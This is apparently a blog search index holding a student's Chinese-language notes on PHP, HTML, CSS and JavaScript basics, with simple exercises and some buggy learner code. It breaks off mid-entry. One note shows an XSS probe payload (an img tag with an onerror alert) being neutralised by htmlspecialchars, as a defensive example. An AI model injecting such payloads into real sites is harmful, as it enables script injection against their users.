<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[welcome]]></title>
    <url>%2F2019%2F08%2F06%2Fwelcome%2F</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[note17]]></title>
    <url>%2F2019%2F08%2F06%2Fnote17%2F</url>
    <content type="text"><![CDATA[Abstract: PHP语言中while和for的用法，以及PHP数组的用法。 1. PHP三种工作模式(文件后缀解析时有何区别)1.1 module模式LAMP — Linux Apache Php Mysql php作为apache模块运行，apache遇到一个php文件，，就相当于执行系统命令 php a.php，文件后缀解析以apache配置文件为主，如果apache认为.xxx文件时php脚本，就当作php执行。 1.2 CGI模式LNMP — Linux Nginx Php Mysql php会监听一个端口，nginx/phpstorm/iis等中间件遇到一个php文件时，会把请求转发给php监听的端口。 有两个配置文件，一个是中间件，一个是php服务的，nginx/iis认为.xxx后缀文件是php脚本，交给php处理，但在php配置文件中，会有一个限制php5/php3/phtml/php能够被识别。 第三周总结 最底部有三种模式的对比。 2. PHP数组#### 2.1 数值数组​ 自动分配ID键（ID键总是从0开始） 123456&lt;?php $cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;); echo $cars[0]; //输出&quot;Volvo&quot; echo $cars[1]; //输出&quot;BMW&quot; echo $cars[2]; //输出&quot;Toyota&quot;?&gt; ​ count()函数—获取数组的长度 1234&lt;?php $cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;); echo count($cars);?&gt; ​ 遍历数值数组 12345678&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); $arrlength=count($cars); for($x=0;$x&lt;$arrlength;$x++)&#123; echo $cars[$x]; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; 为一个数组增加一位，不适合用上述这种方法遍历。 12345678910111213141516171819&lt;?php $arr = array(&apos;name&apos;=&gt;&apos;zs&apos;, 2, &apos;age&apos;=&gt;18, 1); echo $arr[&apos;name&apos;]; //zs echo PHP_EOL; echo $arr[0]; //2 echo PHP_EOL; echo $arr[&apos;age&apos;]; //18 echo PHP_EOL; echo $arr[1]; //1 $arr1 = array(1,2,3,4,5); $arr1[0] = 6; echo PHP_EOL; $arr1[100] = 100; echo PHP_EOL; echo $arr1[0], $arr1[100]; for($i=0; $i&lt;=100; $i++)&#123; //610062345 报错，直到i=100时把100输出 echo $arr1[$i]; &#125;?&gt; 使用foreach就不会报错，数值数组和关联数组混合时，关联数组并不影响数值数组的下标。 2.2 关联数组关联数组可以指定键的数组 1234&lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); echo &quot;Peter is &quot; . $age[&apos;Peter&apos;] . &quot; years old.&quot;;?&gt; 遍历关联数组 123456789&lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); foreach($age as $x=&gt;$x_value) &#123; echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; 1234567891011121314151617&lt;?php $arr = array(1, 2, 3, 4, 5); foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; $arr[5]=709; foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; $arr[100] = 100; foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; ?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习2]]></title>
    <url>%2F2019%2F08%2F06%2Fpractice2%2F</url>
    <content type="text"><![CDATA[Abstract: PHP语言if-else/switch-case和while练习 题目一：输入年月日，计算是该年的多少天。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php//form: year.month.day$date = fgets(STDIN);$Date = explode(&apos;.&apos;, $date);echo $Date;$year = $Date[0];$month = $Date[1];$day = $Date[2];echo &quot;&lt;br&gt;&quot;;echo $year;echo &quot;&lt;br&gt;&quot;;echo $month;echo &quot;&lt;br&gt;&quot;;echo $day;if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123; $flag=1;&#125;else&#123; $flag=0;&#125;switch($month)&#123; case($month&lt;=2): $days = 31*($month-1)+$day; break; case(3&lt;=$month&amp;&amp;$month&lt;=8): if($flag==1)&#123; if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + 29 + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125;else&#123; if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + 28 + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 28 + 30 * (intval(($month) / 2)-2) + $day; &#125; &#125; break; default: if($flag==1)&#123; if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + 29 + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125;else&#123; if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + 28 + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 28 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125; break;&#125;echo $days;?&gt; 代码缺点：可以看出来代码有些地方重复使用，没有达到简洁的目的，瑞年和平年在二月相差一天，完全可以通过flag这个标识来弥补。改进思路：设置一个FebDays的变量，把值设为28，在case里面不需要再次判断瑞年平年，计算days时，把flag加上，这样就可以把瑞平年分开。 改进版： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php//year-month-day$date = fgets(STDIN);$Date = explode(&apos;.&apos;, $date);echo $Date;$year = $Date[0];$month = $Date[1];$day = $Date[2];echo &quot;&lt;br&gt;&quot;;echo $year;echo &quot;&lt;br&gt;&quot;;echo $month;echo &quot;&lt;br&gt;&quot;;echo $day;if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123; $flag=1;&#125;else&#123; $flag=0;&#125;$FebDays = 28;switch($month)&#123; case($month&lt;=2): $days = 31*($month-1)+$day; break; case(3&lt;=$month&amp;&amp;$month&lt;=8): if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day; &#125; break; default: if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day; &#125; break;&#125;echo $days;?&gt; 两段代码对比可以发现，计算天数的代码量较少的将近一半。 题目二：可以一直输入学生成绩，知道输入q/exit/quit退出程序 思路一：在死循环里面执行代码，符合退出条件时break 12345678910111213141516171819202122232425262728293031323334&lt;?phpwhile(1)&#123; echo &quot;Please Input Your Mes: &quot;; $inMes = fgets(STDIN); var_dump($inMes); if((trim($inMes)==&quot;q&quot;)||(trim($inMes)==&quot;quit&quot;)||(trim($inMes)==&quot;exit&quot;))&#123; break; &#125; else &#123; switch ($inMes) &#123; case(90 &lt;= $inMes &amp;&amp; $inMes &lt;= 100): echo &quot;Your Grade is A&quot;; break; case(80 &lt;= $inMes &amp;&amp; $inMes &lt; 90): echo &quot;YourGrade is B&quot;; break; case(70 &lt;= $inMes &amp;&amp; $inMes &lt; 80): echo &quot;Your Grade is C&quot;; break; case(60 &lt;= $inMes &amp;&amp; $inMes &lt; 70): echo &quot;YourGrade is D&quot;; break; case($inMes &lt; 60): echo &quot;YourGrade is E&quot;; break; default: break; &#125; echo PHP_EOL; &#125;&#125;?&gt; 问题与解决： * 退出不成功，用`var_dump($inMes)`查看发现，系统会在输入字符后加`\n`,用`trim()`函数解决 * 输入其他字符，php会把字符转换成数字，然后进行比较思路二：把退出逻辑写在while()括号内 12345678910111213141516171819202122&lt;?php$Grade = fgets(STDIN);$sss = array(&quot;q&quot;,&quot;exit&quot;,&quot;quit&quot;);//如果$Grade不在$sss数组中就继续执行程序while(!in_array(trim($Grade), $sss))&#123; switch($Grade)&#123; case $Grade&gt;=90 &amp;&amp; $Grade&lt;100; echo &quot;A&quot;; break; case $Grade&gt;=60 &amp;&amp; $Grade&lt;90; echo &quot;B&quot;; break; case $Grade&lt;60 &amp;&amp; $Grade&gt;=0; echo &quot;C&quot;; break; default: echo &apos;ERROR!&apos;; &#125; echo PHP_EOL; $Grade = fgets(STDIN);&#125;?&gt; 问题与解决： * 在处理`$Grade`与`$sss`时，想另辟蹊径，在数组`$sss`里面字符后加上`\n`但始终没有成功，最终还是对`$Grade`进行`trim()`处理。​]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note16]]></title>
    <url>%2F2019%2F08%2F06%2Fnote16%2F</url>
    <content type="text"><![CDATA[Abstract: PHP中的运算符、字符串操作和流程控制 1. PHP运算符字符串和数字进行比较时，把字符串转成数字，然后比较。 NULL False ‘’ [] 0 布尔值均为False 2. PHP常用函数 函数名称 作用 addslashes($string) ‘ “ 空 \ 前添加\，转移特殊字符，防御SQL注入 bin2hex() 计算ASCII码 chr(ascii: 0x) ASCII码转换成字符 crypt(‘passwd’ , salt) 加密函数 md5($str) hash计算 explode(‘.’, $str) 根据提供的字符，来切割字符串，结果是一个数组 htmlspecialchars($payload) ‘ “ &lt; &gt; &amp; 转义特殊字符为html实体编码，防御xss implode(‘.’, $str ) 返回一个由数组元素组合成的字符串 str_ireplace(sear,rep, subj) 替换字符串 strchr(haystack, needle) 查找字符串，并返回字符串之后的所有内容 strcmp(str1, str2) 比较字符串，区分大小写 strlen($str) 计算字符串长度 substr(str, start, length) 字符串截取，按“位”截取 mb_substr(str, start, length) 同上，按“字”截取 trim($str) 去除两侧空白字符 PHP String函数 addslashes()函数返回在预定义的字符前添加反斜杠的字符串 预定义字符是： 1234* 单引号(&apos;)* 双引号(&quot;)* 反斜杠(\)* NULL 12345678910111213&lt;?php$str = addslashes(&quot;what does &quot;yolo&quot; mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does &apos;yolo&apos; mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does \yolo\ mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does \x00 mean?&quot;);echo $str;?&gt; OUT 123456/*what does \"yolo\" mean?what does \'yolo\' mean?what does \\yolo\\ mean?What does \0 mean?*/ bin2hex()把ASCII值返回字符；chr()把指定ASCII值返回字符。 12345678&lt;?phpecho bin2hex(&quot;\n&quot;);echo PHP_EOL;echo chr(0x61);echo PHP_EOL;$str = bin2hex(&quot;Hello World!&quot;);echo($str);?&gt; OUT 12345/*0aa48656c6c6f20576f726c6421*/ crypt(str, salt)返回使用DES、Blowfish或MD5算法加密的字符串 md5()计算字符串的MD5散列 1234567&lt;?phpecho crypt('123456', 'rl');$str = 'hello';echo md5($str);?&gt; 1* explode(separator, string, limit)使用一个字符串分割另一个字符串，并返回字符串组成的数组 123456789101112131415&lt;?php$a = array();$url = &apos;https://www.baidu.com&apos;;$url = explode(&apos;.&apos;, $url);$host = $url[0];$name = $url[1];$or = $url[2];echo $host;echo PHP_EOL;echo $name;echo PHP_EOL;echo $or;echo PHP_EOL;echo ($a==0);?&gt; OUT 12345/*https://wwwbaiducom*/ 1* htmlentities()函数把字符转换为HTML实体 1234&lt;?php$str = &quot;&lt;© W3CSçh°°¦§&gt;&quot;;echo htmlentities($str);?&gt; OUT 123/*&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;*/ htmlspecialchars(string, flags, character-set, double_encode) 函数把一些预定义的字符转换为 HTML 实体 &amp; —&gt; $amp “ —&gt; &amp;quot ‘ —&gt; ‘ &lt; —&gt; &amp;lt &gt; —&gt; &amp;gt 12345678910111213&lt;?php$payload = &apos;&lt;img src=&quot;a&quot; onerror=&quot;alert(1)&quot;&gt;&apos;;echo htmlspecialchars($payload);$str = &quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;;echo htmlspecialchars($str);echo array()==null;echo PHP_EOL;$str = &quot;&lt;© W3CSçh°°¦§&gt;&quot;;echo htmlentities($str);?&gt; OUT 1234567/*&amp;lt;img src=&amp;quot;a&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;This is some &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt; text.1&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;*/ 1* import(separator, array)返回一个由数组元素组成字符串 123456&lt;?php$arr = array(&apos;Hello&apos;,&apos;World!&apos;,&apos;Beautiful&apos;,&apos;Day!&apos;);echo implode(&quot; &quot;,$arr);?&gt; OUT 123/*Hello World! Beautiful Day!*/ 12* str_ireplace(find, replace, string, count)替换字符串中一些字符(不区分大小写) * strchr(string, search,before_search)搜索字符串在另一字符串中第一次出现 strcmp(sting1, string2)比较两个字符串 返回0 - 如果两个字符相等 返回&lt;0 - string1&lt;string2 返回&gt;0 - string1&gt;string2 trim()移除字符串两侧空白字符或其他预定义字符 1234567891011&lt;?phpecho str_ireplace(&quot;WORLD&quot;, &quot;Peter&quot;, &quot;Hello world!&quot;);echo PHP_EOL;echo strchr(&quot;Hello world!&quot;,&quot;world&quot;);echo PHP_EOL;echo strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;);echo PHP_EOL;$str = &quot;Hello World!&quot;;echo $str . &quot;&lt;br&gt;&quot;;echo trim($str,&quot;Hed!&quot;);?&gt; OUT 123456/*Hello Peter!world!0Hello World!&lt;br&gt;llo Worl*/ substr(str, start, length)函数返回字符串的一部分；按”位“截取 mb_substr(str, start, length)函数返回字符串的一部分，按”字“截取 start 正数—字符串指定位置开始 负数—从字符串结尾指定位置开始 0 —字符串第一个字符处开始 length 正数—从start参数所在位置返回 负数—从字符串末端返回 1234&lt;?phpecho substr(&quot;Hello World !&quot;,0, 5); // 字符串截取，按照`位`截取echo mb_substr(&quot;abc你好!菜鸟！&quot;,0, 4); // 字符串截取，按照`字`截取?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week3sum]]></title>
    <url>%2F2019%2F08%2F04%2Fweek3sum%2F</url>
    <content type="text"><![CDATA[Abstract: 对第三周学习内容的总结 1. HTML123456789101112131415161718&lt;!--&lt;!DOCTYPE html&gt;声明为HTML5文档--&gt;&lt;!--HTML超文本标记语言--&gt;&lt;!--HTML文档也叫做web页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;HTML&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt; 标题 &lt;/h1&gt; &lt;p&gt; 段落 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 文本域、密码字段和提交按钮 12345&lt;form name="input" action="htmlFormAction.php" method="get"&gt; Name: &lt;input type="text" name="name"&gt;&lt;br&gt; Password: &lt;input type="password" name="password"&gt; &lt;input type="submit"value="Submit"&gt; &lt;/form&gt; 单选按钮 1234&lt;form&gt; &lt;input type="radio" name="sex" value="male"&gt;Male&lt;br&gt; &lt;input type="radio" name="sex" value="female"&gt;Female&lt;br&gt;&lt;/form&gt; 复选框 1234&lt;form&gt; &lt;input type="checkbox" name="vehicle" value="Bike"&gt; I have a bike&lt;br&gt; &lt;input type="checkbox" name="vehicle" value="Car"&gt;I have acar&lt;/form&gt; 附：HTML速查列表 ​ HTML参考手册 HTML测验 测试网址：HTML测验 产生粗体字的HTML标签是&lt;b&gt;。 电子邮件链接：&lt;a href=&quot;mailto:xxx@yyy&quot;&gt;。 产生下拉列表的是&lt;select&gt;。 12345678&lt;form action=""&gt; &lt;select name="cars"&gt; &lt;option value="volvo"&gt;Volvo&lt;/option&gt; &lt;option value="saab"&gt;Saab&lt;/option&gt; &lt;option value="fiat"&gt;Fiat&lt;/option&gt; &lt;option value="audi" selected&gt; Audi&lt;/option&gt; &lt;/select&gt;&lt;/form&gt; XML和HTML的区别：HTML不要求标记的嵌套，配对等，不要求标记间具有一定的顺序，而XML则是严格要求嵌套，配对。 DOM代表文档对象模型，DTD是文档类型定义。 div标签的作用是：按逻辑划分页面文档。 meta标签作用用于：存储与浏览器和搜索引擎相关的信息。 对于HTML中的框架(Iframe/frameset)如何指定屏幕的其余部分：使用*。 当前文档和链接文档之间的关系是使用属性rel指定的。 target的默认属性值在HTML中为_self HTML标记用于定义图像映射中的可单击区域是&lt;area&gt; 2. CSS 选择器 CSS中id选择器以&quot;#&quot;来定义，类选择器以&quot;.&quot;来定义。 插入样式表三种方法 外部样式表 123&lt;head&gt; &lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt;&lt;/head&gt; 内部样式表 1234567&lt;head&gt;&lt;style&gt; hr &#123;color: sienna;&#125; p &#123;margin-left: 20px;&#125; body&#123;background-img: url("images/back40.gif");&#125;&lt;/style&gt;&lt;/head&gt; 内联样式 123&lt;p style="color:sienna; margin-left:20px"&gt; 段落 &lt;/p&gt; 优先级：内联 &gt; 内部 &gt; 外联 CSS测试 测试网址：CSS测试 外部样式表正确引用的方法： 1&lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt; HTML文档中，引用外部样式表正确位置是在&lt;head&gt;部分。 backgroud-color属性可用于改变背景颜色，color可改变某个元素的文本颜色。 测试二中实例 12345678910111213/*粗体*/p &#123;font-weight: bold&#125;/*超链接无下划线*/a &#123;text-decoration: none&#125;/*文本以大写字母开头*/text-transform: capitalize/*改变元素字体*/font-family/*边框上10 下5 左20 右1*//*上右下左*/border-widrh: 10 1 5 20/*产生带有正方形标记的项目列表*/list-style-type: square 测试三—五中实例 123456789101112/*使用CSS3创建圆角*/border-radius: 30px;/*CSS3中元素添加阴影*/box-shadow: 10px 10px 5px grey;/*使用CSS3强制换行*/word-wrap: break-word;/*CSS用于盒子居中*/margin: 0 auto;/*盒子内内联元素居中*/text-align: center;/*CSS中导入样式表正确语法*/@import url(css/example.css); 3. JavaScript​ HTML定义网页内容，CSS描述网页布局，JS介绍网页行为 JavaScript用法 123&lt;script&gt; alert("My First JavaScript");&lt;/script&gt; JavaScript输出 12345678&lt;!--弹出警告框--&gt;window.alert()&lt;!--将内容写到HTML文档中--&gt;document.write()&lt;!--写入到HTML元素--&gt;innerHTML&lt;!--写入到浏览器的控制台--&gt;console.log() 12345678910//单行注释/*多行注释*///JavaScript使用关键字var定义变量var x, lengthx = 5length = 6//JavaScript对大小写是敏感的 JavaScript事件 12345678910111213&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JavaScript事件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button onclick="getElementById('demo').innerHTML=Date()"&gt; 现在时间 &lt;/button&gt; &lt;p id="demo"&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; ​ 常见的HTML事件 事件 描述 onchange HTML元素改变 onclick 用户点击HTML元素 onmouseover 用户在一个HTML元素上移动鼠标 onmouseout 用户从一个HTML元素上移开鼠标 onkeydown 用户按下键盘按键 onload 浏览器已完成页面的加载 JavaScript HTML DOM 改变HTML 123456//修改时间document.write(Date());//修改HTML内容document.getElementById("id").innerHTML="new text";//改变HTML属性document.getElementById("id").attribute="new attribute"; 改变CSS 12//改变HTML样式document.getElementById(id).style.property="new style" 1234567891011&lt;!--使用事件修改HTML样式--&gt;&lt;html&gt; &lt;body&gt; &lt;h1 id='id1'&gt; 标题 &lt;/h1&gt; &lt;button type="button" onclick="document.getElementById('id1').style.color='red'"&gt; 点我！点我！！ &lt;/button&gt; &lt;/body&gt;&lt;/html&gt; EventListener 1234element.addEventListener(event, function, useCapture)//第一个参数是事件的类型（"click"和"mousedown"）//第二个参数是事件触发后调用的函数//第三个参数是布尔值用于描述事件是冒泡还是捕获，该参数可选 1234567891011121314151617181920&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;EventListener&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; 使用addEventListener()方法在用户点击按钮时执行函数 &lt;/p&gt; &lt;button id="myBtn"&gt; 点我！ &lt;/button&gt; &lt;script&gt; document.getElementById('myBtn').addEventListener("click", myFunction); function myFunction()&#123; alert("Hello World!"); &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 创建新的HTML元素-appendChild() 123456789101112131415161718192021222324&lt;html&gt; &lt;head&gt; &lt;title&gt;创建新元素&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="div1"&gt; &lt;p id="p1"&gt; 第一个段落 &lt;/p&gt; &lt;p id="p2"&gt; 第二个段落 &lt;/p&gt; &lt;/div&gt; &lt;script&gt; var para=document.createElement("p"); var node=document.createTextNode("第三个段落") para.appendChile(node); var element=document.getElementById("div1"); var chile=document.getElementById("p1"); element.appendChild(para, child); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; BOM 常用函数 函数 作用 window.open()/close() 打开新窗口/关闭当前串口 window.moveTo() 移动当前窗口 window.resizeTo() 调整当前窗口的尺寸 location.hostname web主机的域名 location.pathname 当前页面的路径和文件名 location.port web主机的端口（80/443） location.protocol web协议 location.href 当前页面的URL loaction.assign() 加载新文档 更多BOM函数请访问BOM JavaScript测试 测试网址 外部脚本不能包含&lt;script&gt;标签。 如何在浏览器的状态栏放入一条消息？ 1window.status="put your message here" 预测以下JavaScript输出 1234&lt;script type="text/javascript"&gt; a = 8 + "8"; document.write(a);&lt;/script&gt; 88。 JavaScript中没有float/integer/double等数据类型。 JavaScript的.length属性用于计算任意字符串中的字符数。 trim()方法用于删除字符串开头和结尾的空格。 4. PHP PHP变量 以$符号开始，必须以字母和下划线开始，变量名只能包含字母数字字符以及下划线。 Note: 变量名是区分大小写的 echo和print语句 echo可以输出一个或多个字符串，输出速度比print快 print只允许输出一个字符串，返回值总为1 EOF使用说明 123456789&lt;?php$name=&quot;变量会被解析&quot;;$a=&lt;&lt;&lt;EOF$name&lt;br&gt;&lt;a&gt;html格式会被解析&lt;/a&gt;&lt;/br&gt;双引号和HTML格式外的其他内容都不会被解析 &quot;双引号外所有被排列好的格式都会被保留&quot;&quot;但是双引号内会保留转义符的转移效果，比如table:\t和换行:\n下一行&quot;EOF;echo $a;?&gt; PHP三种工作模式 工作模式 特点 CLI模式 命令行运行模式 CGI模式 通过CGI接口从HTTP服务器取得输入，然后把运行的结果通过CGI接口交给HTTP服务器，而HTTP服务器把结果送给浏览器 module模式 LAMP体系最常用的工作方式，php被编译为apache一个内置模块，启动时加载，当有一个php请求过来时，直接在httpd进程完成php解释运行，将结果返回。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习1改进版]]></title>
    <url>%2F2019%2F08%2F04%2Fpractice1Update%2F</url>
    <content type="text"><![CDATA[Abstract: practice1实战二改进版 根据页面的行数，生成一个不同颜色的页面，0-3红色背景，4-6蓝色背景，7-9绿色背景，10-12黑色背景，13-15紫色背景，超过为白色。 12345678910111213141516171819202122232425262728293031323334353637&lt;html&gt; &lt;head&gt; &lt;title&gt;Line Color&lt;/title&gt; &lt;style&gt; ul&#123; list-style-type: none; margin: 0; padding: 0; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $color=&quot;&quot;; echo &quot;&lt;ul&gt;&quot;; for($i=1; $i&lt;=15; $i++)&#123; if(0&lt;=$i &amp;&amp; $i&lt;=3)&#123; $color=&quot;red&quot;; &#125; elseif(4&lt;=$i &amp;&amp; $i&lt;=6)&#123; $color=&quot;yellow&quot;; &#125; elseif(7&lt;=$i &amp;&amp; $i&lt;=9)&#123; $color=&quot;blue&quot;; &#125; elseif(10&lt;=$i &amp;&amp; $i&lt;=12)&#123; $color=&quot;pink&quot;; &#125; elseif(13&lt;=$i &amp;&amp; $i&lt;=15)&#123; $color=&quot;green&quot;; &#125; echo &quot;&lt;li style=\&quot;background:$color; width=200px;color: $color\&quot;&gt;&amp;nbsp&lt;/li&gt;&quot;; &#125; echo &quot;&lt;/ul&gt;&quot;; ?&gt; &lt;/body&gt;&lt;/html&gt; 效果如下：]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week3points]]></title>
    <url>%2F2019%2F08%2F03%2Fweek3points%2F</url>
    <content type="text"><![CDATA[Abstract: 对第三周学习内容的扫盲 1. EOF用下面的例子对EOF会有更深的理解 123456789&lt;?php $name=&quot;变量会被解析&quot;; $a=&lt;&lt;&lt;EOF $name&lt;br&gt;&lt;a&gt;html格式会被解析&lt;/a&gt;&lt;br/&gt;双引号和html格式外的其他内容都不会被解析 &quot;双引号外所有被排列好的格式都会被保留&quot; &quot;但是双引号内会保留转义符的转义效果，比如table:\t和换行:\n下一行&quot;EOF; echo $a;?&gt; 若把table:\t和换行:\n下一行换成table:\\t和换行:\\n效果如下： 2. PHP $_SERVER$_SERVER是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组PHP SERVER 3. GET vs POST GET和POST都创建数组，此数组包含键/值对，其中的键是表单控件名称，值是来自用户输入数据 GET和POST被视作$GET和$_POST，它们超全局变量，这意味着对它们的访问无需考虑作用域—无需任何特殊代码，就能够访问它们。 $_GET通过URL参数传递到当前脚本的变量数组； $_POST是通过HTTP POST传递到当前脚本变量数组 处理方式 不同点 GET 1. 所有变量名和值显示在URL中 2. 对发送的信息数量有限制 POST 1. 发送信息不可见，信息嵌入到HTTP请求主题中 2. 所发送信息数量无限制 此外，POST支持高阶功能，比如在向服务器上传文件时进行multi-part二进制输入。]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
        <category>知识盲点</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习1]]></title>
    <url>%2F2019%2F08%2F03%2Fpractice1%2F</url>
    <content type="text"><![CDATA[Abstract: PHP简单实战 实战一 ：根据之前学习的HTML知识，使用PHP来编写一个页面，页面内容显示出浏览器的信息。包括浏览器信息，系统信息，文件位置信息，PHP版本，文件行数。同时保证页面的美观。 123456789101112131415161718192021&lt;html&gt;&lt;head&gt; &lt;title&gt;显示浏览器信息&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php echo $_SERVER[&quot;HTTP_USER_AGENT&quot;]; echo &quot;&lt;br&gt;&quot;; echo PHP_OS; echo &quot;&lt;br&gt;&quot;; echo __DIR__; echo &quot;&lt;br&gt;&quot;; echo PHP_VERSION; echo &quot;&lt;br&gt;&quot;; echo __LINE__; echo &quot;&lt;br&gt;&quot;; echo __FILE__; ?&gt;&lt;/body&gt;&lt;/html&gt; 效果显示： 实战二 ：根据页面的行数，生成一个不同颜色的页面，0-3红色背景，4-6蓝色背景，7-9绿色背景，10-12黑色背景，13-15紫色背景，超过为白色。 1234&lt;?php echo &quot;&lt;body bgcolor=\&quot;white\&quot;&gt;&lt;/body&gt; &lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;;?&gt; 效果显示： 缺点：刚开始的想法是使用for循环+__LINE__实现，但并实现，目前方法过于死板，有改进空间。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note15]]></title>
    <url>%2F2019%2F08%2F03%2Fnote15%2F</url>
